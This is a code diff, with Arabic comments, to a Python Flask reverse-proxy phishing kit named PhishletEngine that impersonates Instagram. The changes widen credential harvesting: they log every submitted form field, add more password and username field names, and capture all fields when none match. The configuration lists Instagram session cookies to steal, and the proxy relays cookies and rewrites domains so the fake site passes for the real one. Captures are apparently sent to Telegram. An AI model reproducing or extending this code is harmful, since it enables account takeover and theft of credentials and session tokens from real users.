@@ -42,13 +42,22 @@ class PhishletEngine:
         self.send_to_telegram(msg)
 
     def capture_creds(self, form_data):
+        # سجل جميع الحقول القادمة لمساعدتك في التصحيح
+        logging.info(f"Received form data: {form_data}")
+
         found = {}
+        # ابحث عن الحقول المحددة مسبقاً
         for field in self.creds_fields:
             if field in form_data:
                 found[field] = form_data[field]
+        # ابحث عن أي حقل يحتوي على كلمات مفتاحية
         for key, value in form_data.items():
-            if any(k in key.lower() for k in ['login', 'user', 'pass', 'email', 'mail', 'pwd', 'password']):
+            if any(k in key.lower() for k in ['login', 'user', 'pass', 'email', 'mail', 'pwd', 'password', '_user']):
                 found[key] = value
+        # إذا لم نجد شيئاً، أرسل كل الحقول (للتشخيص)
+        if not found and form_data:
+            found = dict(form_data)  # التقط كل شيء
+
         if found:
             cred_id = datetime.now().strftime("%y%m%d_%H%M%S")
             captured_creds[cred_id] = {
@@ -91,15 +100,12 @@ class PhishletEngine:
         return None
 
     def rewrite_content(self, content, content_type, current_host):
-        """إعادة كتابة بسيطة: استبدال النطاق فقط دون تغيير المسارات"""
         if 'text/html' in content_type or 'application/javascript' in content_type:
             try:
                 if isinstance(content, bytes):
                     content = content.decode('utf-8', errors='ignore')
-                # استبدال النطاق الأصلي بالنطاق الحالي
                 content = content.replace(f"https://{self.target_domain}", f"https://{current_host}")
                 content = content.replace(f"http://{self.target_domain}", f"https://{current_host}")
-                # أيضاً استبدال النطاقات الفرعية المحتملة
                 for proxy in self.proxy_hosts:
                     orig_domain = f"{proxy['orig_sub']}.{self.target_domain}" if proxy['orig_sub'] else self.target_domain
                     content = content.replace(orig_domain, current_host)
@@ -109,29 +115,23 @@ class PhishletEngine:
                 return content
         return content
 
-# ------------------------ إعدادات إنستجرام ------------------------
+# إعدادات إنستجرام (محدثة)
 phishlet = PhishletEngine(
     name='Instagram',
-    target_domain='www.instagram.com',  # النطاق الرئيسي
+    target_domain='www.instagram.com',
     proxy_hosts=[
         {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'instagram.com'},
-        {'phish_sub': 'i', 'orig_sub': 'i', 'domain': 'instagram.com'},       # للصور
-        {'phish_sub': 'help', 'orig_sub': 'help', 'domain': 'instagram.com'}, # للمساعدة
+        {'phish_sub': 'i', 'orig_sub': 'i', 'domain': 'instagram.com'},
+        {'phish_sub': 'help', 'orig_sub': 'help', 'domain': 'instagram.com'},
         {'phish_sub': 'about', 'orig_sub': 'about', 'domain': 'instagram.com'},
         {'phish_sub': 'blog', 'orig_sub': 'blog', 'domain': 'instagram.com'}
     ],
     auth_tokens=[
-        'sessionid',        # الأهم: معرف الجلسة
-        'ds_user_id',       # معرف المستخدم
-        'csrftoken',        # توكن الحماية
-        'rur',              # FRM (ربما)
-        'mid',              # معرف الجهاز
-        'ig_did',           # معرف الجهاز
-        'datr',             # معرف المتصفح
-        'shbid', 'shbts'    # للحماية
+        'sessionid', 'ds_user_id', 'csrftoken', 'rur', 'mid', 'ig_did', 'datr', 'shbid', 'shbts'
     ],
     creds_fields=[
-        'username', 'password'
+        'username', 'password', 'emailOrPhone', 'enc_password', 'email',
+        'pass', 'login', 'identifier', '_user', 'user', 'pwd'
     ],
     auth_urls=[
         'https://www.instagram.com/accounts/onetap/?next=%2F',
@@ -140,7 +140,6 @@ phishlet = PhishletEngine(
     ]
 )
 
-# ------------------------ المسارات ------------------------
 @app.before_request
 def check_visit():
     if request.path == '/' and 'visited' not in request.cookies:
@@ -181,7 +180,6 @@ def proxy(path):
     host = request.headers.get('Host', '').split(':')[0]
     engine = phishlet
 
-    # بناء عنوان URL الهدف بشكل صحيح
     base_url = f"https://{engine.target_domain}"
     target_url = urljoin(base_url, path)
     if request.query_string:
@@ -213,13 +211,11 @@ def proxy(path):
             if location:
                 parsed = urlparse(location)
                 if engine.target_domain in parsed.netloc or 'instagram.com' in parsed.netloc:
-                    # استبدال النطاق بالنطاق الحالي
                     new_location = location.replace(parsed.netloc, host)
                 else:
                     new_location = location
                 proxy_resp = make_response('', resp.status_code)
                 proxy_resp.headers['Location'] = new_location
-                # نقل الكوكيز
                 for cookie_name, cookie_value in resp.cookies.items():
                     proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
                 if resp.cookies:
